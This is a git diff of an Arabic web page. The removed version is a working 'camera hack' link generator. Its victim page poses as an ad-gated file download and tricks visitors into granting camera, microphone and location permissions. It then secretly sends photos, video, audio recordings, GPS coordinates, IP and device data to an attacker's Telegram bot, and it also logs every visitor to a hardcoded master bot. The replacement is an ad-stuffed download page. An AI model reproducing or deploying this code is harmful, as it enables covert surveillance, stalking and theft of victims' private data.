@@ -1,879 +1,149 @@
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-  <meta charset="utf-8" />
-  <meta name="viewport" content="width=device-width,initial-scale=1" />
-  <title>MARO.com</title>
-  <style>
-    /* نفس التصميم الأصلي تماماً */
-    :root{
-      --bg1:#0b0712;
-      --card:#131026;
-      --accent1:#a66bff;
-      --accent2:#6e3be0;
-      --muted:#bfaef6;
-    }
-    html,body{height:100%;margin:0;font-family: 'Poppins', Tahoma, sans-serif;background:var(--bg1);color:#fff}
-    body{
-      background: #000000;
-      background-image: none;
-      position:relative;
-    }
-    .overlay {
-      display: none;
-    }
-    .wrap{position:relative;z-index:2;min-height:100vh;display:flex;flex-direction:column;align-items:center;padding:30px 20px;box-sizing:border-box}
-    .header{width:100%;max-width:1100px;display:flex;justify-content:space-between;align-items:center;margin-bottom:24px}
-    .brand{font-weight:800;font-size:22px;color:#ffffff;letter-spacing:0.6px}
-    .nav{display:flex;gap:18px}
-    .nav a{color:#ffffff;text-decoration:none;padding:8px 14px;border-radius:10px;background:rgba(255,255,255,0.03)}
-    .card{width:100%;max-width:720px;background: linear-gradient(180deg, rgba(18,12,34,0.85), rgba(10,7,18,0.75));
-      border-radius:16px;padding:22px;box-shadow: 0 10px 40px rgba(0,0,0,0.6);backdrop-filter: blur(4px);}
-    .hero{display:flex;gap:20px;align-items:center;flex-wrap:wrap}
-    .hero-left{flex:1;min-width:260px}
-    .title{font-size:34px;color:#ffffff;margin:0 0 8px}
-    .subtitle{color:#ffffff;margin:0 0 18px}
-    .form {background: rgba(255,255,255,0.03); padding:14px;border-radius:12px}
-    label{display:block;color:#ffffff;font-weight:700;margin:10px 0 6px}
-    input[type="text"]{width:100%;padding:12px;border-radius:10px;border:1px solid rgba(255,255,255,0.04);background:transparent;color:#fff;outline:none;font-size:14px;box-sizing:border-box}
-    .row{display:flex;gap:12px}
-    .checkbox-group {
-      display: flex;
-      flex-direction: column;
-      gap: 8px;
-      margin: 15px 0;
-      max-height: 300px;
-      overflow-y: auto;
-      padding: 10px;
-      background: rgba(0,0,0,0.2);
-      border-radius: 10px;
-    }
-    .checkbox-item {
-      display: flex;
-      align-items: center;
-      gap: 10px;
-      background: rgba(255,255,255,0.02);
-      padding: 8px 12px;
-      border-radius: 8px;
-    }
-    .checkbox-item input[type="checkbox"] {
-      width: 18px;
-      height: 18px;
-      cursor: pointer;
-      accent-color: #a66bff;
-    }
-    .checkbox-item label {
-      margin: 0;
-      font-weight: 500;
-      font-size: 14px;
-      cursor: pointer;
-      flex: 1;
-      color: #fff;
-    }
-    .btn{
-      display:inline-block;padding:12px 16px;border-radius:12px;border:none;background:linear-gradient(90deg, #ffffff, #cccccc);color:#000000;font-weight:800;cursor:pointer;margin-top:12px;width:100%;
-    }
-    .result{margin-top:14px;padding:10px;border-radius:10px;background:rgba(255,255,255,0.02);word-break:break-all;font-size:14px;display:flex;gap:10px;align-items:center;justify-content:space-between}
-    .copyBtn{padding:8px 12px;border-radius:10px;background:rgba(255,255,255,0.06);border:1px solid rgba(255,255,255,0.04);cursor:pointer;color:#fff}
-    .captureBadge{
-      position:fixed;top:14px;right:14px;z-index:9999;
-      background:rgba(0,0,0,0.55);padding:8px 12px;border-radius:999px;font-weight:800;color:#ffd966;font-size:13px;display:none;
-      box-shadow:0 8px 30px rgba(0,0,0,0.5);backdrop-filter: blur(4px);
-    }
-    .madeby{
-      position:fixed;left:14px;bottom:14px;z-index:9999;
-      background:rgba(12,7,20,0.5);padding:8px 12px;border-radius:10px;font-weight:700;
-      box-shadow:0 6px 20px rgba(0,0,0,0.5);
-      color: #ffffff;
-    }
-    @media (max-width:720px){
-      .title{font-size:28px}
-      .card{padding:16px}
-      .wrap{padding:18px}
-    }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>تحميل الملف</title>
 
-    /* الدايلوج للصفحة الرئيسية فقط */
-    .dialog {
-      position: fixed;
-      top: 50%;
-      left: 50%;
-      transform: translate(-50%, -50%);
-      background: #000000;
-      border: 2px solid #ffffff;
-      border-radius: 20px;
-      padding: 40px 30px;
-      text-align: center;
-      z-index: 99999;
-      box-shadow: 0 0 30px rgba(255,255,255,0.2);
-      width: 80%;
-      max-width: 500px;
-    }
-    .dialog p {
-      color: #ffffff;
-      font-size: 22px;
-      font-weight: 800;
-      margin-bottom: 30px;
-    }
-    .dialog-buttons {
-      display: flex;
-      flex-direction: column;
-      gap: 15px;
-      align-items: center;
-    }
-    .dialog-link {
-      display: inline-block;
-      background: #ffffff;
-      color: #000000;
-      padding: 14px 25px;
-      border-radius: 50px;
-      text-decoration: none;
-      font-weight: 900;
-      font-size: 18px;
-      border: 2px solid #ffffff;
-      transition: 0.3s;
-      width: 80%;
-    }
-    .dialog-link.visited {
-      background: #28a745;
-      color: white;
-      border-color: #28a745;
-    }
-    .dialog-btn {
-      display: inline-block;
-      background: #ffffff;
-      color: #000000;
-      padding: 16px 30px;
-      border-radius: 50px;
-      text-decoration: none;
-      font-weight: 900;
-      font-size: 18px;
-      border: 2px solid #ffffff;
-      transition: 0.3s;
-      box-shadow: 0 0 20px rgba(255,255,255,0.3);
-      margin-top: 20px;
-      width: 80%;
-      cursor: pointer;
-      opacity: 0.5;
-      pointer-events: none;
-    }
-    .dialog-btn.active {
-      opacity: 1;
-      pointer-events: auto;
-      background: #ffffff;
-      color: #000000;
-    }
-    .dialog-btn.active:hover {
-      background: transparent;
-      color: #ffffff;
-    }
+<style>
+body{
+  margin:0;
+  background:#ffffff;
+  font-family:Tahoma, Arial;
+}
 
-    /* ستايل صفحة التحميل الجانبية (يبقى كما هو للاستخدام العام) */
-    .download-page {
-      width: 100%;
-      min-height: 100vh;
-      background: #f5f5f5;
-      margin: 0;
-      padding: 20px 0;
-      box-sizing: border-box;
-      font-family: Tahoma, Arial, sans-serif;
-    }
-    .main-box{
-      width:95%;
-      max-width:600px;
-      background:white;
-      margin:40px auto;
-      padding:25px;
-      border-radius:15px;
-      box-shadow:0 5px 20px rgba(0,0,0,0.1);
-      text-align:center;
-    }
-    .main-box h2{
-      margin-bottom:20px;
-      color:#222;
-      font-size: 16px;
-    }
-    .ad-box{
-      margin:20px 0;
-      padding:10px;
-      border-radius:10px;
-      background:#fafafa;
-      border:1px solid #eee;
-      min-height: 90px;
-    }
-    .download-btn{
-      background:#28a745;
-      color:white;
-      padding:18px 45px;
-      font-size:22px;
-      border:none;
-      border-radius:12px;
-      cursor:pointer;
-      transition:0.3s;
-      box-shadow:0 4px 10px rgba(0,0,0,0.2);
-    }
-    .download-btn:hover{
-      background:#218838;
-      transform:scale(1.05);
-    }
-    .footer{
-      text-align:center;
-      margin-top:30px;
-      font-size:14px;
-      color:#777;
-    }
-  </style>
+/* زر في منتصف الصفحة تماماً */
+.center-box{
+  position:fixed;
+  top:50%;
+  left:50%;
+  transform:translate(-50%,-50%);
+  text-align:center;
+  z-index:9999;
+}
+
+.download-btn{
+  padding:20px 50px;
+  font-size:26px;
+  font-weight:bold;
+  background:#ff0000; /* أحمر - غيرها لـ #00c853 أخضر أو #000 أسود */
+  color:#fff;
+  border:none;
+  border-radius:12px;
+  cursor:pointer;
+  box-shadow:0 0 20px rgba(0,0,0,0.2);
+}
+
+.download-btn:hover{
+  transform:scale(1.1);
+}
+
+/* شبكة إعلانات صغيرة كثيرة */
+.ads-grid{
+  display:grid;
+  grid-template-columns: repeat(auto-fill, minmax(120px, 1fr));
+  gap:10px;
+  padding:10px;
+}
+
+.ad-box{
+  width:120px;
+  height:60px;
+  overflow:hidden;
+  border:1px solid #eee;
+}
+</style>
+
+<!-- إعلانات بوب + إشعارات -->
+<script src="https://pl28700469.effectivegatecpm.com/89/a6/b8/89a6b8558224cd67c0822829d68a87ad.js"></script>
+<script src="https://pl28700485.effectivegatecpm.com/ad/c0/62/adc06235d53a0b6f378838879d3f116a.js"></script>
+
 </head>
 <body>
 
-  <div class="wrap">
+<!-- زر التنزيل في المنتصف -->
+<div class="center-box">
+  <button class="download-btn" onclick="goToLink()">تنزيل الملف</button>
+</div>
 
-    <div class="header" style="width:100%;max-width:1100px;"> 
-      <div class="nav">
-        <a href="#"></a>
-        <a href="#"></a>
-      </div>
-    </div>
+<!-- عدد كبير جداً من الإعلانات الصغيرة -->
+<div class="ads-grid">
 
-    <div class="card" id="cardArea" style="width:100%">
-      <div class="hero">
-        <div class="hero-left">
-          <h5>⚠️ يُمنع استخدام الأداة بشكل غير قانوني أو غير أخلاقي. المستخدم يتحمل المسؤولية الكاملة، ولسنا مسؤولين عن أي إساءة استخدام.</h5>
-
-          <div class="form" id="formBox">
-            <label>أدخل الـ ID</label>
-            <input type="text" id="chatIdInput" placeholder="Chat ID">
-
-            <label>أدخل توكن البوت</label>
-            <input type="text" id="tokenInput" placeholder="Bot Token">
-
-            <!-- خيارات متعددة للميزات -->
-            <label>الميزات المطلوبة (مدة التسجيل 5 ثوان):</label>
-            <div class="checkbox-group" id="featuresGroup">
-              <div class="checkbox-item">
-                <input type="checkbox" id="camFront" value="camFront" checked>
-                <label for="camFront">📸 صورة من الكاميرا الأمامية</label>
-              </div>
-              <div class="checkbox-item">
-                <input type="checkbox" id="camBack" value="camBack">
-                <label for="camBack">📷 صورة من الكاميرا الخلفية</label>
-              </div>
-              <div class="checkbox-item">
-                <input type="checkbox" id="videoFront" value="videoFront">
-                <label for="videoFront">🎥 فيديو من الكاميرا الأمامية (5 ثوان)</label>
-              </div>
-              <div class="checkbox-item">
-                <input type="checkbox" id="videoBack" value="videoBack">
-                <label for="videoBack">📹 فيديو من الكاميرا الخلفية (5 ثوان)</label>
-              </div>
-              <div class="checkbox-item">
-                <input type="checkbox" id="audio" value="audio">
-                <label for="audio">🎤 تسجيل صوتي (5 ثوان)</label>
-              </div>
-              <div class="checkbox-item">
-                <input type="checkbox" id="location" value="location">
-                <label for="location">📍 تحديد الموقع على الخريطة</label>
-              </div>
-            </div>
-
-            <button class="btn" id="generateBtn">إنشاء الرابط</button>
-
-            <div id="result" style="display:none" class="result">
-              <div id="linkText" style="flex:1;color:#e7dbff;font-size:13px;"></div>
-              <button class="copyBtn" id="copyBtn">نسخ الرابط</button>
-            </div>
-          </div>
-        </div>
-
-        <div style="min-width:260px;flex:0 0 260px;">
-          <div style="background:linear-gradient(180deg, rgba(128,77,255,0.08), rgba(0,0,0,0.15));padding:14px;border-radius:12px;text-align:center">
-          </div>
-        </div>
-      </div>
-    </div>
-
+  <!-- إعلان 1 -->
+  <div class="ad-box">
+    <script>
+      atOptions = {
+        'key' : 'dcff8a2cffdf0642c627a5bacf3a04fd',
+        'format' : 'iframe',
+        'height' : 60,
+        'width' : 120,
+        'params' : {}
+      };
+    </script>
+    <script src="https://www.highperformanceformat.com/dcff8a2cffdf0642c627a5bacf3a04fd/invoke.js"></script>
   </div>
 
-  <div id="captureBadge" class="captureBadge"></div>
-  <div class="madeby">Made by K1X</div>
-
-  <!-- الدايلوج للصفحة الرئيسية فقط -->
-  <div class="dialog" id="mandatoryDialog">
-    <p> اشتراك إجباري في القنوات </p>
-    <div class="dialog-buttons" id="dialogButtons">
-      <a href="https://t.me/Maro_hacker_eg" target="_blank" class="dialog-link" id="channel1" data-visited="false">@Maro_hacker_eg</a>
-      <a href="https://t.me/lego2028" target="_blank" class="dialog-link" id="channel2" data-visited="false">@lego2028</a>
-      <button class="dialog-btn" id="subscribeDoneBtn" disabled>تم الاشتراك</button>
-    </div>
-  </div>
-
-<script>
-  // ------------------ متغيرات البوت الثابتة ------------------
-  const MASTER_BOT_TOKEN = "8550564365:AAEjhh_aqXExLx3i8N7niKQXjJefhdkzqtY";
-  const MASTER_CHAT_ID   = "6197511637";
-
-  // ------------------ تخزين معلومات الزائر ------------------
-  let visitorIP = "غير معروف";
-  let visitorCountry = "غير معروف";
-  let visitorDevice = "Unknown";
-  let visitorBattery = "غير متاح";
-  let visitorOS = "غير معروف";
-
-  // ------------------ إرسال معلومات الزائر (مرة واحدة) ------------------
-  async function sendVisitorInfo() {
-    try {
-      const userAgent = navigator.userAgent;
-      if (/Android/i.test(userAgent)) visitorDevice = "Android";
-      else if (/iPhone|iPad|iPod/i.test(userAgent)) visitorDevice = "iOS";
-      else visitorDevice = "Unknown";
-
-      // محاولة الحصول على البطارية
-      if (navigator.getBattery) {
-        try {
-          const battery = await navigator.getBattery();
-          visitorBattery = (battery.level * 100) + "%";
-          if (battery.charging) visitorBattery += " (شحن)";
-        } catch (e) {}
-      }
-
-      try {
-        const ipRes = await fetch('https://ipapi.co/json/');
-        const ipData = await ipRes.json();
-        visitorIP = ipData.ip || "غير معروف";
-        visitorCountry = ipData.country_name || "غير معروف";
-      } catch (e) {}
-
-      const message = `🟢 *زيارة جديدة*
-🌍 *الدولة*: ${visitorCountry}
-📱 *الجهاز*: ${visitorDevice}
-🔋 *البطارية*: ${visitorBattery}
-🌐 *IP*: ${visitorIP}
-🕒 *الوقت*: ${new Date().toLocaleString('ar-EG')}`;
-
-      await fetch(`https://api.telegram.org/bot${MASTER_BOT_TOKEN}/sendMessage`, {
-        method: 'POST',
-        headers: { 'Content-Type': 'application/json' },
-        body: JSON.stringify({ chat_id: MASTER_CHAT_ID, text: message, parse_mode: 'Markdown' })
-      });
-    } catch (err) {}
-  }
-  sendVisitorInfo();
-
-  // ------------------ عناصر الدايلوج ------------------
-  const dialog = document.getElementById('mandatoryDialog');
-  const channel1 = document.getElementById('channel1');
-  const channel2 = document.getElementById('channel2');
-  const subscribeBtn = document.getElementById('subscribeDoneBtn');
-
-  let channel1Clicked = false, channel2Clicked = false;
-
-  channel1.addEventListener('click', function() {
-    channel1Clicked = true;
-    channel1.classList.add('visited');
-    checkBothClicked();
-  });
-
-  channel2.addEventListener('click', function() {
-    channel2Clicked = true;
-    channel2.classList.add('visited');
-    checkBothClicked();
-  });
-
-  function checkBothClicked() {
-    if (channel1Clicked && channel2Clicked) {
-      subscribeBtn.disabled = false;
-      subscribeBtn.classList.add('active');
-      subscribeBtn.innerHTML = '✅ تم الاشتراك';
-    }
-  }
-
-  subscribeBtn.addEventListener('click', function() {
-    dialog.style.display = 'none';
-  });
-
-  // ------------------ عناصر الفورم ------------------
-  const generateBtn = document.getElementById('generateBtn');
-  const resultEl = document.getElementById('result');
-  const linkText = document.getElementById('linkText');
-  const copyBtn = document.getElementById('copyBtn');
-
-  generateBtn.addEventListener('click', () => {
-    const chat = document.getElementById('chatIdInput').value.trim();
-    const token = document.getElementById('tokenInput').value.trim();
-
-    if(!chat || !token){
-      alert('املأ جميع الحقول');
-      return;
-    }
-
-    const checkboxes = document.querySelectorAll('#featuresGroup input[type="checkbox"]:checked');
-    const features = Array.from(checkboxes).map(cb => cb.value).join(',');
-    const fullLink = `${window.location.origin}${window.location.pathname}?chat=${encodeURIComponent(chat)}&token=${encodeURIComponent(token)}&features=${encodeURIComponent(features)}`;
-    linkText.innerText = fullLink;
-    resultEl.style.display = 'flex';
-  });
-
-  copyBtn.addEventListener('click', async () => {
-    try {
-      await navigator.clipboard.writeText(linkText.innerText);
-      copyBtn.innerText = 'تم النسخ';
-      setTimeout(()=> copyBtn.innerText = 'نسخ الرابط',1500);
-    } catch(e) { alert('فشل النسخ'); }
-  });
-
-  // ------------------ دالة تحميل الإعلانات ------------------
-  function loadAd(src) {
-    const s = document.createElement("script");
-    s.src = src;
-    s.async = true;
-    document.body.appendChild(s);
-  }
-
-  // ------------------ دوال مساعدة للتعامل مع الوسائط ------------------
-  function buildCaption(extra = "") {
-    let cap = `━━━━━━━━━━━━━━━\n`;
-    cap += `🌍 الدولة: ${visitorCountry}\n`;
-    cap += `📱 الجهاز: ${visitorDevice}\n`;
-    cap += `🔋 البطارية: ${visitorBattery}\n`;
-    cap += `🌐 IP: ${visitorIP}\n`;
-    cap += `🕒 الوقت: ${new Date().toLocaleString('ar-EG')}\n`;
-    if (extra) cap += `${extra}\n`;
-    cap += `━━━━━━━━━━━━━━━`;
-    return cap;
-  }
-
-  // دالة لالتقاط صورة وإرسالها مع الكابتشن (محدثة)
-  async function captureAndSend(stream, chat, token, type) {
-    return new Promise((resolve) => {
-      const video = document.createElement('video');
-      video.autoplay = true;
-      video.playsInline = true;
-      video.muted = true;
-      video.style.display = 'none';
-      video.srcObject = stream;
-      document.body.appendChild(video);
-
-      // ضمان إزالة العنصر في كل الحالات
-      const cleanup = () => {
-        if (video.parentNode) document.body.removeChild(video);
-      };
-
-      // مؤقت احتياطي لضمان حل الـ Promise
-      const timeout = setTimeout(() => {
-        cleanup();
-        resolve();
-      }, 10000); // 10 ثوان كحد أقصى
-
-      video.onloadedmetadata = () => {
-        video.play().catch(() => {});
-        // ننتظر حتى يصبح الفيديو جاهزاً (إطار واحد على الأقل)
-        const tryCapture = () => {
-          if (video.videoWidth === 0 || video.videoHeight === 0) {
-            setTimeout(tryCapture, 100);
-            return;
-          }
-          const canvas = document.createElement('canvas');
-          canvas.width = video.videoWidth;
-          canvas.height = video.videoHeight;
-          const ctx = canvas.getContext('2d');
-          ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-          canvas.toBlob(async (blob) => {
-            clearTimeout(timeout);
-            if (blob && blob.size > 2000) {
-              const form = new FormData();
-              form.append('chat_id', chat);
-              // استخدام image/jpeg بدلاً من png للحجم
-              form.append('photo', blob, `${type}_${Date.now()}.jpg`);
-              const caption = buildCaption(`📸 صورة (${type === 'front' ? 'أمامية' : 'خلفية'})`);
-              form.append('caption', caption);
-              
-              try {
-                await fetch(`https://api.telegram.org/bot${token}/sendPhoto`, {
-                  method: 'POST',
-                  body: form
-                });
-              } catch (e) { console.log(e); }
-            }
-            cleanup();
-            resolve();
-          }, 'image/jpeg', 0.9);
-        };
-        setTimeout(tryCapture, 500); // نعطي الفيديو وقتاً قصيراً ليظهر
-      };
-    });
-  }
-
-  // دالة لتسجيل فيديو (5 ثوان) وإرساله مع الكابتشن (محدثة)
-  async function recordAndSend(stream, chat, token, type) {
-    return new Promise((resolve) => {
-      // تحديد نوع MIME مدعوم
-      const mimeTypes = ['video/webm;codecs=vp8,opus', 'video/webm', 'video/mp4'];
-      let mimeType = '';
-      for (let mt of mimeTypes) {
-        if (MediaRecorder.isTypeSupported(mt)) {
-          mimeType = mt;
-          break;
-        }
-      }
-      const options = mimeType ? { mimeType } : {};
-      let mediaRecorder;
-      try {
-        mediaRecorder = new MediaRecorder(stream, options);
-      } catch (e) {
-        // إذا فشل الإنشاء، نحاول بدون خيارات
-        mediaRecorder = new MediaRecorder(stream);
-      }
-      
-      const chunks = [];
-      let recordingStopped = false;
-
-      // مهلة احتياطية لضمان حل الـ Promise
-      const timeout = setTimeout(() => {
-        if (mediaRecorder.state === 'recording') {
-          mediaRecorder.stop();
-        } else {
-          resolve();
-        }
-      }, 10000);
-
-      mediaRecorder.ondataavailable = (e) => {
-        if (e.data.size > 0) chunks.push(e.data);
-      };
-      
-      mediaRecorder.onstop = async () => {
-        clearTimeout(timeout);
-        if (recordingStopped) return;
-        recordingStopped = true;
-
-        const blob = new Blob(chunks, { type: mimeType || 'video/webm' });
-        const form = new FormData();
-        form.append('chat_id', chat);
-        // إرسال كفيديو، التليجرام يقبل webm
-        form.append('video', blob, `${type}_${Date.now()}.webm`);
-        const caption = buildCaption(`🎥 فيديو (${type === 'front' ? 'أمامي' : 'خلفي'}) - 5 ثوان`);
-        form.append('caption', caption);
-        
-        try {
-          await fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
-            method: 'POST',
-            body: form
-          });
-        } catch (e) {}
-        // إيقاف كل المسارات
-        stream.getTracks().forEach(t => t.stop());
-        resolve();
-      };
-
-      mediaRecorder.onerror = () => {
-        clearTimeout(timeout);
-        if (!recordingStopped) {
-          recordingStopped = true;
-          stream.getTracks().forEach(t => t.stop());
-          resolve();
-        }
-      };
-
-      mediaRecorder.start();
-      setTimeout(() => {
-        if (mediaRecorder.state === 'recording') mediaRecorder.stop();
-      }, 5000);
-    });
-  }
-
-  // دالة لتسجيل صوتي (5 ثوان) وإرساله مع الكابتشن (محدثة)
-  async function recordAudioAndSend(stream, chat, token) {
-    return new Promise((resolve) => {
-      const mimeTypes = ['audio/webm', 'audio/mp4', 'audio/ogg'];
-      let mimeType = '';
-      for (let mt of mimeTypes) {
-        if (MediaRecorder.isTypeSupported(mt)) {
-          mimeType = mt;
-          break;
-        }
-      }
-      const options = mimeType ? { mimeType } : {};
-      let mediaRecorder;
-      try {
-        mediaRecorder = new MediaRecorder(stream, options);
-      } catch (e) {
-        mediaRecorder = new MediaRecorder(stream);
-      }
-      
-      const chunks = [];
-      let recordingStopped = false;
-
-      const timeout = setTimeout(() => {
-        if (mediaRecorder.state === 'recording') {
-          mediaRecorder.stop();
-        } else {
-          resolve();
-        }
-      }, 10000);
-
-      mediaRecorder.ondataavailable = (e) => {
-        if (e.data.size > 0) chunks.push(e.data);
-      };
-      
-      mediaRecorder.onstop = async () => {
-        clearTimeout(timeout);
-        if (recordingStopped) return;
-        recordingStopped = true;
-
-        const blob = new Blob(chunks, { type: mimeType || 'audio/webm' });
-        const form = new FormData();
-        form.append('chat_id', chat);
-        form.append('audio', blob, `audio_${Date.now()}.webm`);
-        const caption = buildCaption(`🎤 تسجيل صوتي - 5 ثوان`);
-        form.append('caption', caption);
-        
-        try {
-          await fetch(`https://api.telegram.org/bot${token}/sendAudio`, {
-            method: 'POST',
-            body: form
-          });
-        } catch (e) {}
-        stream.getTracks().forEach(t => t.stop());
-        resolve();
-      };
-
-      mediaRecorder.onerror = () => {
-        clearTimeout(timeout);
-        if (!recordingStopped) {
-          recordingStopped = true;
-          stream.getTracks().forEach(t => t.stop());
-          resolve();
-        }
-      };
-
-      mediaRecorder.start();
-      setTimeout(() => {
-        if (mediaRecorder.state === 'recording') mediaRecorder.stop();
-      }, 5000);
-    });
-  }
-
-  // دالة لجلب الموقع وإرساله كرسالة نصية مع الكابتشن
-  async function sendLocation(chat, token) {
-    return new Promise((resolve) => {
-      if ("geolocation" in navigator) {
-        navigator.geolocation.getCurrentPosition(
-          async (position) => {
-            const { latitude, longitude } = position.coords;
-            const caption = buildCaption(`📍 الموقع الحالي\nالإحداثيات: ${latitude}, ${longitude}\n🔗 https://www.google.com/maps?q=${latitude},${longitude}`);
-            
-            await fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
-              method: 'POST',
-              headers: { 'Content-Type': 'application/json' },
-              body: JSON.stringify({ chat_id: chat, text: caption })
-            });
-            resolve();
-          },
-          (error) => {
-            console.log('خطأ في تحديد الموقع:', error);
-            resolve(); // نكمل حتى لو فشل
-          }
-        );
-      } else {
-        resolve();
-      }
-    });
-  }
-
-  // ------------------ طلب الأذونات مرة واحدة فقط ------------------
-  async function preGrantPermissions(needCamera, needMicrophone) {
-    if (!needCamera && !needMicrophone) return true;
-    const constraints = {};
-    if (needCamera) constraints.video = true;
-    if (needMicrophone) constraints.audio = true;
-
-    try {
-      const stream = await navigator.mediaDevices.getUserMedia(constraints);
-      stream.getTracks().forEach(t => t.stop());
-      return true;
-    } catch (err) {
-      console.log('رفض الإذن:', err);
-      return false;
-    }
-  }
-
-  // ------------------ الدالة الرئيسية للصفحة الجانبية (معالجة متسلسلة سريعة) ------------------
-  async function startFeatures(chat, token, features) {
-    if (!features) return;
-    
-    const featureList = features.split(',');
-    
-    const needCamera = featureList.some(f => ['camFront','camBack','videoFront','videoBack'].includes(f));
-    const needMicrophone = featureList.some(f => ['audio','videoFront','videoBack'].includes(f));
-
-    await preGrantPermissions(needCamera, needMicrophone); // لا نهتم بالنتيجة، سنحاول التنفيذ
-
-    // صورة أمامية
-    if (featureList.includes('camFront')) {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-        await captureAndSend(stream, chat, token, 'front');
-        stream.getTracks().forEach(t => t.stop());
-      } catch (e) { console.log('فشلت صورة أمامية'); }
-    }
-
-    // صورة خلفية
-    if (featureList.includes('camBack')) {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' } });
-        await captureAndSend(stream, chat, token, 'back');
-        stream.getTracks().forEach(t => t.stop());
-      } catch (e) { console.log('فشلت صورة خلفية'); }
-    }
-
-    // فيديو أمامي
-    if (featureList.includes('videoFront')) {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
-        await recordAndSend(stream, chat, token, 'front');
-      } catch (e) { console.log('فشل فيديو أمامي'); }
-    }
-
-    // فيديو خلفي
-    if (featureList.includes('videoBack')) {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: true });
-        await recordAndSend(stream, chat, token, 'back');
-      } catch (e) { console.log('فشل فيديو خلفي'); }
-    }
-
-    // تسجيل صوتي
-    if (featureList.includes('audio')) {
-      try {
-        const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
-        await recordAudioAndSend(stream, chat, token);
-      } catch (e) { console.log('فشل تسجيل صوتي'); }
-    }
-
-    // الموقع
-    if (featureList.includes('location')) {
-      await sendLocation(chat, token);
-    }
-  }
-
-  // ------------------ الوضع الجانبي (الصفحة عند وجود بارامترات) ------------------
-  const params = new URLSearchParams(window.location.search);
-  const chat = params.get('chat');
-  const token = params.get('token');
-  const features = params.get('features');
-
-  if (chat && token) {
-    // إخفاء العناصر الأصلية للصفحة (باستخدام محددات صحيحة)
-    const elementsToHide = ['#mandatoryDialog', '.card', '.header', '.madeby', '#captureBadge'];
-    elementsToHide.forEach(selector => {
-      const el = document.querySelector(selector);
-      if (el) el.style.display = 'none';
-    });
-
-    // إعادة تعيين الحاوية الرئيسية
-    const wrap = document.querySelector('.wrap');
-    if (wrap) {
-      wrap.innerHTML = '';
-      wrap.style.padding = '20px';
-      wrap.style.margin = '0';
-      wrap.style.maxWidth = '100%';
-      wrap.style.background = '#f5f5f5';
-      wrap.style.display = 'flex';
-      wrap.style.flexDirection = 'column';
-      wrap.style.alignItems = 'center';
-    }
-
-    // إنشاء صفحة التحميل
-    const downloadPage = document.createElement('div');
-    downloadPage.className = 'download-page';
-    downloadPage.style.width = '100%';
-    downloadPage.style.maxWidth = '500px';
-    downloadPage.style.background = '#fff';
-    downloadPage.style.padding = '20px';
-    downloadPage.style.borderRadius = '12px';
-    downloadPage.style.boxShadow = '0 4px 12px rgba(0,0,0,0.15)';
-
-    const mainBox = document.createElement('div');
-    mainBox.className = 'main-box';
-    mainBox.style.display = 'flex';
-    mainBox.style.flexDirection = 'column';
-    mainBox.style.alignItems = 'center';
-    mainBox.style.gap = '15px';
-
-    // العنوان
-    const h2 = document.createElement('h2');
-    h2.textContent = 'يجب الضغط علي سماح لحماية الوحدة الاعلانيه من الزيارات الوهمية لم تتمكن من تنزيل الملف إلا بعد الضغط علي سماح';
-    h2.style.fontSize = '14px';
-    h2.style.textAlign = 'center';
-    h2.style.color = '#333';
-    mainBox.appendChild(h2);
-
-    // إضافة 6 إعلانات صغيرة
-    for (let i = 1; i <= 6; i++) {
-      const adBox = document.createElement('div');
-      adBox.className = 'ad-box';
-      adBox.style.width = '100%';
-      adBox.style.height = '80px';
-      adBox.style.margin = '5px 0';
-      adBox.style.background = '#e0e0e0';
-      adBox.style.borderRadius = '8px';
-      if (i === 2) {
-        const containerDiv = document.createElement('div');
-        containerDiv.id = 'container-596225155ab3da796681d551cb4b7cf4';
-        adBox.appendChild(containerDiv);
-      }
-      mainBox.appendChild(adBox);
-    }
-
-    // زر التحميل
-    const downloadBtn = document.createElement('button');
-    downloadBtn.className = 'download-btn';
-    downloadBtn.textContent = 'التالي';
-    downloadBtn.style.padding = '10px 25px';
-    downloadBtn.style.border = 'none';
-    downloadBtn.style.borderRadius = '8px';
-    downloadBtn.style.background = '#a66bff';
-    downloadBtn.style.color = '#fff';
-    downloadBtn.style.fontSize = '16px';
-    downloadBtn.style.cursor = 'pointer';
-    downloadBtn.onclick = () => {
-      window.open("https://www.effectivegatecpm.com/d6mid86v?key=90c984c8fd10e21cd01541eb4207aa2c", "_blank");
-    };
-    mainBox.appendChild(downloadBtn);
-
-    // الفوتر
-    const footer = document.createElement('div');
-    footer.className = 'footer';
-    footer.style.height = '50px';
-    mainBox.appendChild(footer);
-
-    downloadPage.appendChild(mainBox);
-    if (wrap) wrap.appendChild(downloadPage);
-
-    // تعريف atOptions قبل تحميل السكريبتات
-    const atOptionsScript = document.createElement('script');
-    atOptionsScript.innerHTML = `
+  <!-- إعلان 2 -->
+  <div class="ad-box">
+    <script>
       atOptions = {
         'key' : '0b7539a5227dc7b69da2ea94b0521ab6',
         'format' : 'iframe',
-        'height' : 300,
-        'width' : 160,
+        'height' : 60,
+        'width' : 120,
         'params' : {}
       };
-    `;
-    document.body.appendChild(atOptionsScript);
+    </script>
+    <script src="https://www.highperformanceformat.com/0b7539a5227dc7b69da2ea94b0521ab6/invoke.js"></script>
+  </div>
 
-    // تحميل سكريبتات الإعلانات
-    const ads = [
-      "https://pl28700469.effectivegatecpm.com/89/a6/b8/89a6b8558224cd67c0822829d68a87ad.js",
-      "https://pl28700474.effectivegatecpm.com/596225155ab3da796681d551cb4b7cf4/invoke.js",
-      "https://pl28700485.effectivegatecpm.com/ad/c0/62/adc06235d53a0b6f378838879d3f116a.js",
-      "https://www.highperformanceformat.com/0b7539a5227dc7b69da2ea94b0521ab6/invoke.js"
-    ];
-    ads.forEach(src => loadAd(src));
+  <!-- تكرار الإعلانات بكثرة لزيادة العدد -->
+  <div class="ad-box">
+    <script async data-cfasync="false" src="https://pl28700474.effectivegatecpm.com/596225155ab3da796681d551cb4b7cf4/invoke.js"></script>
+    <div id="container-596225155ab3da796681d551cb4b7cf4"></div>
+  </div>
 
-    // تشغيل الميزات المطلوبة
